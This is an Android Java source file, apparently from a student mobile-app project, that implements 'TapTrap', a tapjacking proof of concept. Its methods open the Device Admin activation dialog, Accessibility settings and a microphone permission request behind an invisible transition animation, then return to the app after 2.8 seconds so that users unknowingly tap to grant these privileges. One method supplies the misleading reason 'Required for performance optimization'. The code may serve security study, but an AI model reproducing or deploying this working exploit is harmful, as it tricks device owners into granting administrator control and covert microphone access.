package com.example.inf2007_mad_j1847.test;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.inf2007_mad_j1847.test.AppDeviceAdminReceiver;
import com.example.inf2007_mad_j1847.R;

public class TapTrap {

    private final ComponentActivity activity;
    private final ComponentName adminComponent;
    private static final int MICROPHONE_PERMISSION_REQUEST_CODE = 2001;

    public TapTrap(ComponentActivity activity) {
        this.activity = activity;
        this.adminComponent = new ComponentName(activity, AppDeviceAdminReceiver.class);
    }


    public boolean isPermissionGranted(String permission) {
        int result = ContextCompat.checkSelfPermission(activity, permission);
        boolean granted = (result == PackageManager.PERMISSION_GRANTED);

        String simpleName = permission.substring(permission.lastIndexOf('.') + 1);
        Log.d("tapTrap", "Permission " + simpleName + ": " +
                (granted ? "✅ GRANTED" : "❌ DENIED"));

        return granted;
    }

    public void launchDeviceAdminTrap() {
        // Intent to activate Device Admin
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for performance optimization");

        // 🔴 LAUNCH SYSTEM DIALOG
        activity.startActivity(intent);

        // 🔴 MAKE IT INVISIBLE
        activity.overridePendingTransition(R.anim.ani, R.anim.ani);

        // 🔴 ESCAPE BEFORE DIALOG BECOMES VISIBLE (2.8 seconds)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 2800);


    }


    public void launchAccessibilityTrap() {
        // Intent to open Accessibility settings
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);

        // 🔴 LAUNCH SYSTEM SETTINGS
        activity.startActivity(intent);

        // 🔴 MAKE IT INVISIBLE
        activity.overridePendingTransition(R.anim.ani, R.anim.ani);

        // 🔴 ESCAPE BEFORE SCREEN BECOMES VISIBLE (2.8 seconds)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 2800);
    }

//    public void launchAppAccessibilityTrap() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
//        activity.startActivity(intent);
//
//        activity.overridePendingTransition(R.anim.ani, R.anim.ani);
//
//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
//            activity.startActivity(new Intent(activity, activity.getClass()));
//            activity.finish();
//        }, 2800);
//    }

    public void testInvisiblePermission() {
        // Request permission
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.RECORD_AUDIO},
                MICROPHONE_PERMISSION_REQUEST_CODE);

        // 🔴 TRY TO MAKE IT INVISIBLE
        // Note: This may NOT work because permission dialogs are special
        activity.overridePendingTransition(R.anim.ani, R.anim.ani);

        // Escape after delay
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 2800);
        isPermissionGranted(Manifest.permission.RECORD_AUDIO);
    }



    public void testInvisible2() {

        int animId = R.anim.ani;
        Log.d("TapTrap", "Animation resource ID: " + animId);

        // This will throw exception if resource doesn't exist
        activity.getResources().getAnimation(animId);
        Log.d("TapTrap", "✅ Animation resource loaded successfully");

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);



        // 🔴 LAUNCH ACTIVITY
        activity.startActivity(intent);

        // 🔴 MAKE IT INVISIBLE - THIS WORKS!
        activity.overridePendingTransition(R.anim.ani, R.anim.ani);

        // Escape after delay
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            activity.startActivity(new Intent(activity, activity.getClass()));
            activity.finish();
        }, 2800);
    }




}